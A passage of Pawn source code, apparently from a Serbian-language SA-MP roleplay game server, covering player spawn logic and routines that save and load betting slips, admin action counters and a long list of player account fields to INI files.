					    new i = PlayerInfo[ playerid ][ xRentID ];

					    Novi_SetPlayerPos( playerid, II[ i ][ iExit ][ 0 ], II[ i ][ iExit ][ 1 ], II[ i ][ iExit ][ 2 ] );
				  		GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
					    SetTimerEx( "SlobodnoSada", 6000, false, "i", playerid );
					    SetCameraBehindPlayer( playerid );
				        TogglePlayerControllable( playerid, false );
				    	SetPlayerInterior( playerid, II[ i ][ iInterior ] );
						SetPlayerVirtualWorld( playerid, II[ i ][ iVW ] );
						inProperty[ playerid ] = i;
					}
					else {
					    new rand = random( sizeof( RandomLSSpawn1 ) );
						Novi_SetPlayerPos( playerid, RandomLSSpawn1[ rand ][ 0 ], RandomLSSpawn1[ rand ][ 1 ], RandomLSSpawn1[ rand ][ 2 ] );
						SetPlayerFacingAngle( playerid, 360.000 );
						SetTimerEx( "SlobodnoSada", 6000, false, "i", playerid );
						GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
						TogglePlayerControllable( playerid, false );
						SetCameraBehindPlayer( playerid );
						SetPlayerInterior( playerid, 0 );
						PlayerInfo[ playerid ][ xSpawn ] = SPAWN_OBICAN_LS_1;
					}
				}
			}
		}
	}
	return true;
}
//------------------------------------------------------------------------------

forward SaveKladionica( playerid );
public SaveKladionica( playerid ) {

    new string[ 30 ];
	new INI:File = INI_Open( KladIme( playerid ) );

	INI_SetTag( File, "Informacije" );

    INI_WriteBool( File, "Uplaceno", KladionicaListic[ playerid ][ Uplaceno ] );
    INI_WriteBool( File, "Zavrseno", KladionicaListic[ playerid ][ Zavrseno ] );
    INI_WriteInt( File, "Uplata", KladionicaListic[ playerid ][ Uplata ] );
    INI_WriteFloat( File, "Dobitak", KladionicaListic[ playerid ][ Dobitak ] );
    INI_WriteBool( File, "Status", KladionicaListic[ playerid ][ Status ] );
    INI_WriteString( File, "HourPobeda", KladionicaListic[ playerid ][ HourPobeda ]  );
	
	for( new i = 0; i < 10; i++) {

	    format( string, sizeof( string ), "parID%d", i );
		INI_WriteInt( File, string, KladionicaListic[ playerid ][ parID ][ i ] );

		format( string, sizeof( string ), "keciksdva%d", i );
		INI_WriteInt( File, string, KladionicaListic[ playerid ][ keciksdva ][ i ] );

		format( string, sizeof( string ), "Kvota%d", i );
		INI_WriteFloat( File, string, KladionicaListic[ playerid ][ Kvota ][ i ] );

        format( string, sizeof( string ), "teamID1%d", i );
		INI_WriteInt( File, string, KladionicaListic[ playerid ][ teamID1 ][ i ] );

        format( string, sizeof( string ), "teamID2%d", i );
		INI_WriteInt( File, string, KladionicaListic[ playerid ][ teamID2 ][ i ] );

	}
	

	INI_Close( File );
	return true;
}


forward LoadKladionica( playerid, name[ ], value[ ] );
public LoadKladionica( playerid, name[ ], value[ ] ) {

	new string[ 30 ];

    INI_Bool( "Uplaceno", KladionicaListic[ playerid ][ Uplaceno ] );
    INI_Bool( "Zavrseno", KladionicaListic[ playerid ][ Zavrseno ] );
    INI_Int( "Uplata", KladionicaListic[ playerid ][ Uplata ] );
    INI_Float( "Dobitak", KladionicaListic[ playerid ][ Dobitak ] );
    INI_Bool( "Status", KladionicaListic[ playerid ][ Status ] );
    INI_String( "HourPobeda", KladionicaListic[ playerid ][ HourPobeda ], 24  );

	for( new i = 0; i < 10; i++) {
	
	    format( string, sizeof( string ), "parID%d", i );
		INI_Int( string, KladionicaListic[ playerid ][ parID ][ i ] );
		
		format( string, sizeof( string ), "keciksdva%d", i );
		INI_Int( string, KladionicaListic[ playerid ][ keciksdva ][ i ] );
		
		format( string, sizeof( string ), "Kvota%d", i );
		INI_Float( string, KladionicaListic[ playerid ][ Kvota ][ i ] );
		
		format( string, sizeof( string ), "teamID1%d", i );
		INI_Int( string, KladionicaListic[ playerid ][ teamID1 ][ i ] );

        format( string, sizeof( string ), "teamID2%d", i );
		INI_Int( string, KladionicaListic[ playerid ][ teamID2 ][ i ] );
	
	}
	return 1;
}

//------------------------------------------------------------------------------
forward RemoveAttachedObject( playerid, slot );
public RemoveAttachedObject( playerid, slot ) {
	if( IsPlayerConnected( playerid ) && IsPlayerAttachedObjectSlotUsed( playerid, slot ) ) {
	    RemovePlayerAttachedObject( playerid, slot );
	}

    TogglePlayerControllable(playerid, 1);
	return true;
}
//------------------------------------------------------------------------------
ResetujAdmina( playerid ) {
    AI[ playerid ][ aTBan ] = 0;
    AI[ playerid ][ aTWarn ] = 0;
    AI[ playerid ][ aTKick ] = 0;
    AI[ playerid ][ aTCharge ] = 0;
    AI[ playerid ][ aTJail ] = 0;
    AI[ playerid ][ aTUnjail ] = 0;
    AI[ playerid ][ aTUnwarn ] = 0;
    AI[ playerid ][ aTUnban ] = 0;
    AI[ playerid ][ aTPM ] = 0;
}
//------------------------------------------------------------------------------
public OcitajAdmina( playerid, name[ ], value[ ] ) {

    INI_Int( "aTBan", AI[ playerid ][ aTBan ] );
    INI_Int( "aTWarn", AI[ playerid ][ aTWarn ] );
    INI_Int( "aTKick", AI[ playerid ][ aTKick ] );
    INI_Int( "aTCharge", AI[ playerid ][ aTCharge ] );
    INI_Int( "aTJail", AI[ playerid ][ aTJail ] );
    INI_Int( "aTUnjail", AI[ playerid ][ aTUnjail ] );
    INI_Int( "aTUnwarn", AI[ playerid ][ aTUnwarn ] );
    INI_Int( "aTUnban", AI[ playerid ][ aTUnban ] );
    INI_Int( "aTPM", AI[ playerid ][ aTPM ] );
    return 1;
}
//------------------------------------------------------------------------------
public SacuvajAdmina( playerid ) {
	new INI:File = INI_Open( Admini( playerid ) );
	INI_SetTag( File, "Informacije" );
	INI_WriteInt( File, "aTBan", AI[ playerid ][ aTBan ] );
    INI_WriteInt( File, "aTWarn", AI[ playerid ][ aTWarn ] );
	INI_WriteInt( File, "aTKick", AI[ playerid ][ aTKick ] );
    INI_WriteInt( File, "aTCharge", AI[ playerid ][ aTCharge ] );
    INI_WriteInt( File, "aTJail", AI[ playerid ][ aTJail ] );
    INI_WriteInt( File, "aTUnjail", AI[ playerid ][ aTUnjail ] );
    INI_WriteInt( File, "aTUnwarn", AI[ playerid ][ aTUnwarn ] );
    INI_WriteInt( File, "aTUnban", AI[ playerid ][ aTUnban ] );
    INI_WriteInt( File, "aTPM", AI[ playerid ][ aTPM ] );
	INI_Close( File );
	return true;
}
//------------------------------------------------------------------------------
SavePlayer( playerid ) {

		new INI:File = INI_Open( Korisnici( playerid ) );
		INI_SetTag( File, "Informacije" );
		INI_WriteString( File, "Lozinka", PlayerInfo[ playerid ][ xLozinka ] );
		INI_WriteInt( File, "Pol", PlayerInfo[ playerid ][ xPol ] );
		INI_WriteInt( File, "Godine", PlayerInfo[ playerid ][ xGodine ] );
	    INI_WriteInt( File, "Novac", PlayerInfo[ playerid ][ xNovac ] );
		INI_WriteInt( File, "Level", PlayerInfo[ playerid ][ xLevel ] );
		INI_WriteInt( File, "Respekt", PlayerInfo[ playerid ][ xRespekt ] );
		INI_WriteInt( File, "Poboljsanja", PlayerInfo[ playerid ][ xPoboljsanja ] );
		INI_WriteInt( File, "PayDay", PlayerInfo[ playerid ][ xPayDay ] );
		INI_WriteInt( File, "Admin", PlayerInfo[ playerid ][ xAdmin ] );
		INI_WriteInt( File, "Skin", PlayerInfo[ playerid ][ xSkin ] );
		INI_WriteInt( File, "Spawn", PlayerInfo[ playerid ][ xSpawn ] );
		INI_WriteInt( File, "Lider", PlayerInfo[ playerid ][ xLider ] );
		INI_WriteInt( File, "Clan", PlayerInfo[ playerid ][ xClan ] );
		INI_WriteInt( File, "Rank", PlayerInfo[ playerid ][ xRank ] );
		INI_WriteInt( File, "VoziloID1", PlayerInfo[ playerid ][ xVoziloID ][ 0 ] );
		INI_WriteInt( File, "VoziloID2", PlayerInfo[ playerid ][ xVoziloID ][ 1 ] );
		INI_WriteInt( File, "VoziloID3", PlayerInfo[ playerid ][ xVoziloID ][ 2 ] );
		INI_WriteInt( File, "VoziloID4", PlayerInfo[ playerid ][ xVoziloID ][ 3 ] );
		INI_WriteInt( File, "Materijali", PlayerInfo[ playerid ][ xMaterijali ] );
		INI_WriteInt( File, "FirmaID", PlayerInfo[ playerid ][ xFirmaID ] );
		INI_WriteInt( File, "Posao", PlayerInfo[ playerid ][ xPosao ] );
		INI_WriteInt( File, "Ugovor", PlayerInfo[ playerid ][ xUgovor ] );
		INI_WriteInt( File, "MehSkill", PlayerInfo[ playerid ][ xMehSkill ] );
		INI_WriteInt( File, "MDelovi", PlayerInfo[ playerid ][ xMDelovi ] );
		INI_WriteInt( File, "Head", PlayerInfo[ playerid ][ xHead ] );
		INI_WriteFloat( File, "HeadPos1", PlayerInfo[ playerid ][ xHeadPos ][ 0 ] );
		INI_WriteFloat( File, "HeadPos2", PlayerInfo[ playerid ][ xHeadPos ][ 1 ] );
		INI_WriteFloat( File, "HeadPos3", PlayerInfo[ playerid ][ xHeadPos ][ 2 ] );
		INI_WriteFloat( File, "HeadPos4", PlayerInfo[ playerid ][ xHeadPos ][ 3 ] );
		INI_WriteFloat( File, "HeadPos5", PlayerInfo[ playerid ][ xHeadPos ][ 4 ] );
		INI_WriteFloat( File, "HeadPos6", PlayerInfo[ playerid ][ xHeadPos ][ 5 ] );
		INI_WriteFloat( File, "HeadPos7", PlayerInfo[ playerid ][ xHeadPos ][ 6 ] );
		INI_WriteFloat( File, "HeadPos8", PlayerInfo[ playerid ][ xHeadPos ][ 7 ] );
		INI_WriteFloat( File, "HeadPos9", PlayerInfo[ playerid ][ xHeadPos ][ 8 ] );
		INI_WriteInt( File, "Face", PlayerInfo[ playerid ][ xFace ] );
		INI_WriteFloat( File, "FacePos1", PlayerInfo[ playerid ][ xFacePos ][ 0 ] );
		INI_WriteFloat( File, "FacePos2", PlayerInfo[ playerid ][ xFacePos ][ 1 ] );
		INI_WriteFloat( File, "FacePos3", PlayerInfo[ playerid ][ xFacePos ][ 2 ] );
		INI_WriteFloat( File, "FacePos4", PlayerInfo[ playerid ][ xFacePos ][ 3 ] );
		INI_WriteFloat( File, "FacePos5", PlayerInfo[ playerid ][ xFacePos ][ 4 ] );
		INI_WriteFloat( File, "FacePos6", PlayerInfo[ playerid ][ xFacePos ][ 5 ] );
		INI_WriteFloat( File, "FacePos7", PlayerInfo[ playerid ][ xFacePos ][ 6 ] );
		INI_WriteFloat( File, "FacePos8", PlayerInfo[ playerid ][ xFacePos ][ 7 ] );
		INI_WriteFloat( File, "FacePos9", PlayerInfo[ playerid ][ xFacePos ][ 8 ] );
		INI_WriteInt( File, "SungMask", PlayerInfo[ playerid ][ xSungMask ] );
		INI_WriteFloat( File, "SungMaskPos1", PlayerInfo[ playerid ][ xSungMaskPos ][ 0 ] );
		INI_WriteFloat( File, "SungMaskPos2", PlayerInfo[ playerid ][ xSungMaskPos ][ 1 ] );
		INI_WriteFloat( File, "SungMaskPos3", PlayerInfo[ playerid ][ xSungMaskPos ][ 2 ] );
		INI_WriteFloat( File, "SungMaskPos4", PlayerInfo[ playerid ][ xSungMaskPos ][ 3 ] );
		INI_WriteFloat( File, "SungMaskPos5", PlayerInfo[ playerid ][ xSungMaskPos ][ 4 ] );
		INI_WriteFloat( File, "SungMaskPos6", PlayerInfo[ playerid ][ xSungMaskPos ][ 5 ] );
		INI_WriteFloat( File, "SungMaskPos7", PlayerInfo[ playerid ][ xSungMaskPos ][ 6 ] );
		INI_WriteFloat( File, "SungMaskPos8", PlayerInfo[ playerid ][ xSungMaskPos ][ 7 ] );
		INI_WriteFloat( File, "SungMaskPos9", PlayerInfo[ playerid ][ xSungMaskPos ][ 8 ] );
		INI_WriteInt( File, "Cigare", PlayerInfo[ playerid ][ xCigare ] );
		INI_WriteInt( File, "Upaljac", PlayerInfo[ playerid ][ xUpaljac ] );
		INI_WriteInt( File, "BStil", PlayerInfo[ playerid ][ xBStil ] );
		INI_WriteInt( File, "Registrovan", PlayerInfo[ playerid ][ xRegistrovan ] );
		INI_WriteFloat( File, "SHealth", PlayerInfo[ playerid ][ xSHealth ] );
		INI_WriteInt( File, "BrojTelefona", PlayerInfo[ playerid ][ xBrojTelefona ] );
		INI_WriteInt( File, "Vozacka", PlayerInfo[ playerid ][ xVozacka ] );
		INI_WriteInt( File, "Motorska", PlayerInfo[ playerid ][ xMotorska ] );
		INI_WriteInt( File, "KamionskaC1", PlayerInfo[ playerid ][ xKamionskaC1 ] );
		INI_WriteInt( File, "KamionskaC2", PlayerInfo[ playerid ][ xKamionskaC2 ] );
		INI_WriteInt( File, "KamionskaC3", PlayerInfo[ playerid ][ xKamionskaC3 ] );
		INI_WriteInt( File, "Brodska", PlayerInfo[ playerid ][ xBrodska ] );
		INI_WriteInt( File, "Letelica", PlayerInfo[ playerid ][ xLetelica ] );
		INI_WriteInt( File, "Osnovna", PlayerInfo[ playerid ][ xOsnovna ] );
		INI_WriteInt( File, "Srednja", PlayerInfo[ playerid ][ xSrednja ] );
		INI_WriteInt( File, "Fakultet", PlayerInfo[ playerid ][ xFakultet ] );
		INI_WriteInt( File, "SkolaLimit", PlayerInfo[ playerid ][ xSkolaLimit ] );
		INI_WriteInt( File, "Ubijen", PlayerInfo[ playerid ][ xUbijen ] );
		INI_WriteInt( File, "Drug1", PlayerInfo[ playerid ][ xDrug ][ 0 ] );
		INI_WriteInt( File, "Drug2", PlayerInfo[ playerid ][ xDrug ][ 1 ] );
		INI_WriteInt( File, "Drug3", PlayerInfo[ playerid ][ xDrug ][ 2 ] );
		INI_WriteInt( File, "Drug4", PlayerInfo[ playerid ][ xDrug ][ 3 ] );
		INI_WriteInt( File, "Drug5", PlayerInfo[ playerid ][ xDrug ][ 4 ] );
		INI_WriteInt( File, "DrugCode1", PlayerInfo[ playerid ][ xDrugCode ][ 0 ] );
		INI_WriteInt( File, "DrugCode2", PlayerInfo[ playerid ][ xDrugCode ][ 1 ] );
		INI_WriteInt( File, "DrugCode3", PlayerInfo[ playerid ][ xDrugCode ][ 2 ] );
		INI_WriteInt( File, "DrugCode4", PlayerInfo[ playerid ][ xDrugCode ][ 3 ] );
		INI_WriteInt( File, "DrugCode5", PlayerInfo[ playerid ][ xDrugCode ][ 4 ] );
		INI_WriteInt( File, "Solna", PlayerInfo[ playerid ][ xSolna ] );
		INI_WriteInt( File, "Pseudo", PlayerInfo[ playerid ][ xPseudo ] );
		INI_WriteInt( File, "SodaB", PlayerInfo[ playerid ][ xSodaB ] );
		INI_WriteInt( File, "CrveniF", PlayerInfo[ playerid ][ xCrveniF ] );
		INI_WriteInt( File, "LysAcid", PlayerInfo[ playerid ][ xLysAcid ] );
		INI_WriteInt( File, "DesVoda", PlayerInfo[ playerid ][ xDesVoda ] );
		INI_WriteInt( File, "Marihuana", PlayerInfo[ playerid ][ xMarihuana ] );
		INI_WriteInt( File, "Opium", PlayerInfo[ playerid ][ xOpium ] );
		INI_WriteInt( File, "Kalcijum", PlayerInfo[ playerid ][ xKalcij ] );
		INI_WriteInt( File, "AmonijumHlorid", PlayerInfo[ playerid ][ xAmonijH ] );
		INI_WriteInt( File, "Kokain", PlayerInfo[ playerid ][ xKokain ] );
		INI_WriteInt( File, "Kokain2", PlayerInfo[ playerid ][ xKokain2 ] );
		INI_WriteInt( File, "MetilAmin", PlayerInfo[ playerid ][ xMetilAmin ] );
		INI_WriteInt( File, "Hunger", PlayerInfo[ playerid ][ xHunger ] );
		INI_WriteBool( File, "HeroinAddict", PlayerInfo[ playerid ][ xHeroinAddict ] );
		INI_WriteInt( File, "HeroinUsed", PlayerInfo[ playerid ][ xHeroinUsed ] );
		INI_WriteInt( File, "HeroinIndicator", PlayerInfo[ playerid ][ xHeroinIndicator ] );
		INI_WriteBool( File, "CokeCrackAddict", PlayerInfo[ playerid ][ xCokeCrackAddict ] );
		INI_WriteInt( File, "CokeCrackUsed", PlayerInfo[ playerid ][ xCokeCrackUsed ] );
		INI_WriteInt( File, "CokeCrackIndicator", PlayerInfo[ playerid ][ xCokeCrackIndicator ] );
		INI_WriteBool( File, "MethAddict", PlayerInfo[ playerid ][ xMethAddict ] );
		INI_WriteInt( File, "MethIndicator", PlayerInfo[ playerid ][ xMethIndicator ] );
    	INI_WriteInt( File, "MethUsed", PlayerInfo[ playerid ][ xMethUsed ] );
    	INI_WriteBool( File, "Inekcija", PlayerInfo[ playerid ][ xInekcija ] );
    	INI_WriteBool( File, "Toolkit", PlayerInfo[ playerid ][ xToolkit ] );
    	INI_WriteInt( File, "Property1", PlayerInfo[ playerid ][ xProperty ][ 0 ] );
    	INI_WriteInt( File, "Property2", PlayerInfo[ playerid ][ xProperty ][ 1 ] );
    	INI_WriteInt( File, "Property3", PlayerInfo[ playerid ][ xProperty ][ 2 ] );
    	INI_WriteBool( File, "GunLicense", PlayerInfo[ playerid ][ xGunLicense ] );
    	INI_WriteInt( File, "TelefonBon", PlayerInfo[ playerid ][ xTelefonBon ] );
    	INI_WriteInt( File, "ModelTelefona", PlayerInfo[ playerid ][ xModelTelefona ] );
    	INI_WriteInt( File, "Snaga", PlayerInfo[ playerid ][ xSnaga ] );
    	INI_WriteInt( File, "Zatvor", PlayerInfo[ playerid ][ xZatvor ] );
    	INI_WriteInt( File, "ZatvorVreme", PlayerInfo[ playerid ][ xZatvorVreme ] );
    	INI_WriteInt( File, "Wanted", PlayerInfo[ playerid ][ xWanted ] );
    	INI_WriteInt( File, "Uhapsen", PlayerInfo[ playerid ][ xUhapsen ] );
    	INI_WriteInt( File, "PDUhapsio", PlayerInfo[ playerid ][ xPDUhapsio ] );
    	INI_WriteInt( File, "PDStatsTicket", PlayerInfo[ playerid ][ xPDStatsTicket ] );
		INI_WriteInt( File, "PDStatsTicketMoney", PlayerInfo[ playerid ][ xPDStatsTicketMoney ] );
		INI_WriteInt( File, "TakenWeps", PlayerInfo[ playerid ][ xTakenWeps ] );
    	INI_WriteInt( File, "TakenDrugs", PlayerInfo[ playerid ][ xTakenDrugs ] );
    	INI_WriteInt( File, "PocetniTut", PlayerInfo[ playerid ][ xPocetniTut ] );
    	INI_WriteInt( File, "AKod", PlayerInfo[ playerid ][ xAKod ] );
    	INI_WriteInt( File, "Sat", PlayerInfo[ playerid ][ xSat ] );
    	INI_WriteInt( File, "MaskID", PlayerInfo[ playerid ][ xMaskID ] );
    	INI_WriteInt( File, "BRacun", PlayerInfo[ playerid ][ xBRacun ] );
    	INI_WriteInt( File, "PreostaloZaOtplatu", PlayerInfo[ playerid ][ xPreostaloZaOtplatu ] );
    	INI_WriteInt( File, "IznosRate", PlayerInfo[ playerid ][ xIznosRate ] );
    	INI_WriteInt( File, "IznosKredita", PlayerInfo[ playerid ][ xIznosKredita ] );
    	INI_WriteInt( File, "OnlineSati", PlayerInfo[ playerid ][ xOnlineSati ] );
    	INI_WriteInt( File, "RPTeacher", PlayerInfo[ playerid ][ xSupporter ] );
    	INI_WriteInt( File, "RPLearn", PlayerInfo[ playerid ][ xRPLearn ] );
    	INI_WriteInt( File, "Warn", PlayerInfo[ playerid ][ xWarn ] );
    	INI_WriteInt( File, "Mute", PlayerInfo[ playerid ][ xMute ] );
    	INI_WriteFloat( File, "Marker1", PlayerInfo[ playerid ][ xMarker ][ 0 ] );
    	INI_WriteFloat( File, "Marker2", PlayerInfo[ playerid ][ xMarker ][ 1 ] );
    	INI_WriteFloat( File, "Marker3", PlayerInfo[ playerid ][ xMarker ][ 2 ] );
    	INI_WriteInt( File, "BrojNews", PlayerInfo[ playerid ][ xBrojNews ] );
    	INI_WriteInt( File, "OrgUgovor", PlayerInfo[ playerid ][ xOrgUgovor ] );
		INI_WriteInt( File, "Helmet", PlayerInfo[ playerid ][ xHelmet ] );
		INI_WriteInt( File, "BanDays", PlayerInfo[ playerid ][ xBDays ] );
		INI_WriteInt( File, "BanMonths", PlayerInfo[ playerid ][ xBMonths ] );
		INI_WriteInt( File, "BanYear", PlayerInfo[ playerid ][ xBYears ] );
		INI_WriteInt( File, "GradRank", PlayerInfo[ playerid ][ xGradRank ] );
		INI_WriteInt( File, "SkriptaRank", PlayerInfo[ playerid ][ xSkriptaRank ] );
		INI_WriteInt( File, "UlazBL", PlayerInfo[ playerid ][ xUlazBL ] );
		INI_WriteBool( File, "Boombox", PlayerInfo[ playerid ][ xBoombox ] );
		INI_WriteFloat( File, "HelmetPos1", PlayerInfo[ playerid ][ xHelmetPos ][ 0 ] );
		INI_WriteFloat( File, "HelmetPos2", PlayerInfo[ playerid ][ xHelmetPos ][ 1 ] );
		INI_WriteFloat( File, "HelmetPos3", PlayerInfo[ playerid ][ xHelmetPos ][ 2 ] );
		INI_WriteFloat( File, "HelmetPos4", PlayerInfo[ playerid ][ xHelmetPos ][ 3 ] );
		INI_WriteFloat( File, "HelmetPos5", PlayerInfo[ playerid ][ xHelmetPos ][ 4 ] );
		INI_WriteFloat( File, "HelmetPos6", PlayerInfo[ playerid ][ xHelmetPos ][ 5 ] );
		INI_WriteFloat( File, "HelmetPos7", PlayerInfo[ playerid ][ xHelmetPos ][ 6 ] );
		INI_WriteFloat( File, "HelmetPos8", PlayerInfo[ playerid ][ xHelmetPos ][ 7 ] );
		INI_WriteFloat( File, "HelmetPos9", PlayerInfo[ playerid ][ xHelmetPos ][ 8 ] );
		INI_WriteInt( File, "Drzava", PlayerInfo[ playerid ][ xDrzava ] );
		INI_WriteString( File, "Email", PlayerInfo[ playerid ][ xEmail ] );
		INI_WriteInt( File, "VIPLevel", PlayerInfo[ playerid ][ xVIPLevel ] );
        INI_WriteInt( File, "VIPVreme", PlayerInfo[ playerid ][ xVIPVreme ]);
		INI_WriteInt( File, "HitmenCena", PlayerInfo[ playerid ][ xHitmenCena ] );
		INI_WriteInt( File, "Objekt1", PlayerInfo[ playerid ][ xObject ][ 0 ] );
	    INI_WriteInt( File, "Objekt2", PlayerInfo[ playerid ][ xObject ][ 1 ] );
		INI_WriteInt( File, "Objekt3", PlayerInfo[ playerid ][ xObject ][ 2 ] );
	    INI_WriteInt( File, "Objekt4", PlayerInfo[ playerid ][ xObject ][ 3 ] );
		INI_WriteInt( File, "Objekt5", PlayerInfo[ playerid ][ xObject ][ 4 ] );
	    INI_WriteInt( File, "Objekt6", PlayerInfo[ playerid ][ xObject ][ 5 ] );
	    INI_WriteInt( File, "Objekt7", PlayerInfo[ playerid ][ xObject ][ 6 ] );
	    INI_WriteInt( File, "Objekt8", PlayerInfo[ playerid ][ xObject ][ 7 ] );
	    INI_WriteInt( File, "Objekt9", PlayerInfo[ playerid ][ xObject ][ 8 ] );
	    INI_WriteInt( File, "Objekt10", PlayerInfo[ playerid ][ xObject ][ 9 ] );
	    INI_WriteInt( File, "LesLimit", PlayerInfo[ playerid ][ xLesLimit ] );
	    INI_WriteInt( File, "KazneniUgovor", PlayerInfo[ playerid ][ xKazneniUgovor ] );
	    INI_WriteString( File, "OffPJail", PlayerInfo[ playerid ][ xOffPJail ] );
	    INI_WriteString( File, "OffPPrison", PlayerInfo[ playerid ][ xOffPPrison ] );
	    INI_WriteString( File, "OffPMute", PlayerInfo[ playerid ][ xOffPMute ] );
	    INI_WriteInt( File, "StaffMin", PlayerInfo[ playerid ][ xStaffMin ] );
	    INI_WriteString( File, "LastLogin", PlayerInfo[ playerid ][ xLastLogin ] );
	    INI_WriteBool( File, "Married", PlayerInfo[ playerid ][ xMarried ] );
		INI_WriteString( File, "MarriedTo", PlayerInfo[ playerid ][ xMarriedTo ] );
		INI_WriteBool( File, "TogMob", PlayerInfo[ playerid ][ xTogMob ] );
		INI_WriteInt( File, "HotelID", PlayerInfo[ playerid ][ xHotelID ] );
		INI_WriteInt( File, "HotelRoom", PlayerInfo[ playerid ][ xHotelRoom ] );
		INI_WriteInt( File, "Promoter", PlayerInfo[ playerid ][ xPromoter ] );
		INI_WriteInt( File, "FieldID", PlayerInfo[ playerid ][ xFieldID ] );
		INI_WriteInt( File, "Sljive", PlayerInfo[ playerid ][ xSljive ] );
		INI_WriteInt( File, "Kruske", PlayerInfo[ playerid ][ xKruske ] );
		INI_WriteInt( File, "Jabuke", PlayerInfo[ playerid ][ xJabuke ] );
		INI_WriteInt( File, "Kupus", PlayerInfo[ playerid ][ xKupus ] );
		INI_WriteInt( File, "Ruze", PlayerInfo[ playerid ][ xRuze ] );
		INI_WriteInt( File, "SemeSljive", PlayerInfo[ playerid ][ xSemeSljive ] );
		INI_WriteInt( File, "SemeKruske", PlayerInfo[ playerid ][ xSemeKruske ] );
		INI_WriteInt( File, "SemeJabuke", PlayerInfo[ playerid ][ xSemeJabuke ] );
		INI_WriteInt( File, "SemeKupusa", PlayerInfo[ playerid ][ xSemeKupusa ] );
		INI_WriteInt( File, "SemeRuze", PlayerInfo[ playerid ][ xSemeRuze ] );
		INI_WriteInt( File, "LottoNumber", PlayerInfo[ playerid ][ xLottoNumber ] );
		INI_WriteInt( File, "LottoMoney", PlayerInfo[ playerid ][ xLottoMoney ] );
		INI_WriteInt( File, "GarageID", PlayerInfo[ playerid ][ xGarageID ] );
        INI_WriteInt(File, "WorkShopID", PlayerInfo[playerid][xWorkShopID]);
		INI_WriteBool( File, "ImaBRacun", PlayerInfo[ playerid ][ xImaBRacun ] );
		INI_WriteInt( File, "PlatniRacun", PlayerInfo[ playerid ][ xPlatniRacun ] );
		INI_WriteBool( File, "DonatorSlot", PlayerInfo[ playerid ][ xDonatorSlot ] );
		INI_WriteInt( File, "PljackaVreme", PlayerInfo[ playerid ][ xPljackaVreme ] );
		INI_WriteInt( File, "Ranac", PlayerInfo[ playerid ][ xRanac ] );
        INI_WriteInt( File, "DilerUkrao", PlayerInfo[playerid][xDilerUkrao]);
        INI_WriteInt( File, "PolicijaTest", PlayerInfo[playerid][xPolicijaTest]);
		INI_WriteBool( File, "LeaveJail", PlayerInfo[ playerid ][ xLeaveJail ] );
		INI_WriteInt( File, "BailPrice", PlayerInfo[ playerid ][ xBailPrice ] );
		INI_WriteInt( File, "HangarTime", PlayerInfo[ playerid ][ xHangarTime ] );
		INI_WriteInt( File, "Event1Mesto", PlayerInfo[ playerid ][ xEvent1Mesto ] );
		INI_WriteInt( File, "Event2Mesto", PlayerInfo[ playerid ][ xEvent2Mesto ] );
		INI_WriteInt( File, "Event3Mesto", PlayerInfo[ playerid ][ xEvent3Mesto ] );
		INI_WriteInt( File, "DMEventUbistva", PlayerInfo[ playerid ][ xDMEventUbistva ] );
		INI_WriteInt( File, "RentID", PlayerInfo[ playerid ][ xRentID ] );
		INI_WriteInt( File, "Zlato", PlayerInfo[ playerid ][ xZlato ] );
		INI_WriteInt( File, "RezervniKljucevi", PlayerInfo[ playerid ][ xRezervniKljucevi ] );
		INI_WriteInt( File, "RadarBodovi", PlayerInfo[ playerid ][ xRadarBodovi ] );
		INI_WriteBool( File, "DBO", PlayerInfo[ playerid ][ xDBO ] );
		INI_WriteInt( File, "DBoja", PlayerInfo[ playerid ][ xDBoja ] );
		INI_WriteInt( File, "SpecAdmin", PlayerInfo[playerid][xSpecAdmin]);
		INI_WriteInt( File, "LicnaKarta", PlayerInfo[playerid][xLicnaKarta]);
		INI_WriteInt( File, "Pasos", PlayerInfo[playerid][xPasos]);
		INI_WriteInt( File, "LaznaLicna", PlayerInfo[playerid][xLaznaLicna]);
		INI_WriteInt( File, "LazniPasos", PlayerInfo[playerid][xLazniPasos]);
		INI_WriteInt( File, "Dinamit", PlayerInfo[playerid][xDinamit]);
		INI_WriteInt( File, "Laptop", PlayerInfo[playerid][xLaptop]);
		INI_WriteInt(File, "Seme", PlayerInfo[playerid][xSeme]);
		INI_WriteInt(File, "NeoDroga", PlayerInfo[playerid][xNeoDroga]);
		INI_WriteInt(File, "DrogaPosao", PlayerInfo[playerid][xDrogaPosao]);
		INI_WriteInt(File, "AdminDuty", PlayerInfo[playerid][xAdminDuty]);
		INI_WriteInt(File, "RobanjeKuce", PlayerInfo[playerid][xRobanjeKuce]);
        INI_WriteInt(File, "Turpija", PlayerInfo[playerid][xTurpija]);
        INI_WriteInt(File, "PosadioDrogu", PlayerInfo[playerid][xPosadioDrogu]);
        INI_WriteInt(File, "MichaelMisijaSpawn", PlayerInfo[playerid][xMichaelMisijaSpawn]);
        INI_WriteInt(File, "RobanjeMarketa", PlayerInfo[playerid][xRobanjeMarketa]);
        INI_WriteInt(File, "DronAuto", PlayerInfo[playerid][xDronAuto]);
        INI_WriteInt(File, "DronAvion", PlayerInfo[playerid][xDronAvion]);
        INI_WriteInt(File, "DronHelis", PlayerInfo[playerid][xDronHelis]);
        INI_WriteInt(File, "Baterija", PlayerInfo[playerid][xBaterija]);
        INI_WriteInt(File, "Token", PlayerInfo[playerid][xToken]);
        INI_WriteInt(File, "JobSkill", PlayerInfo[playerid][xJobSkill]);
        INI_WriteInt(File, "DeliveryBroj", PlayerInfo[playerid][xDeliveryBroj]);
        INI_WriteInt(File, "MedKit", PlayerInfo[playerid][xMedKit]);
        INI_WriteInt(File, "PrljavNovac", PlayerInfo[playerid][xPrljavNovac]);
        INI_WriteInt(File , "RobanjeTrafike", PlayerInfo[playerid][xRobanjeTrafike]);
        INI_WriteInt(File, "KokainPrerada", PlayerInfo[playerid][xKokainPrerada]);
        INI_WriteInt(File, "KokainPreradaVreme", PlayerInfo[playerid][xKokainPreradaVreme]);
        INI_WriteInt(File, "KokainPreradjeni", PlayerInfo[playerid][xKokainPreradjeni]);
        INI_WriteInt(File, "Bitcoin", PlayerInfo[playerid][xBitcoin]);
        INI_WriteInt(File, "WorkShopGarage", PlayerInfo[playerid][xWorkShopGarage]);
        INI_WriteInt(File, "Key", PlayerInfo[playerid][xKey]);
        INI_WriteInt(File, "Deonice", PlayerInfo[playerid][xDeonice]);
        INI_WriteInt(File, "Paradox", PlayerInfo[playerid][xParadox]);
        INI_WriteInt(File, "Skate", PlayerInfo[playerid][xSkate]);

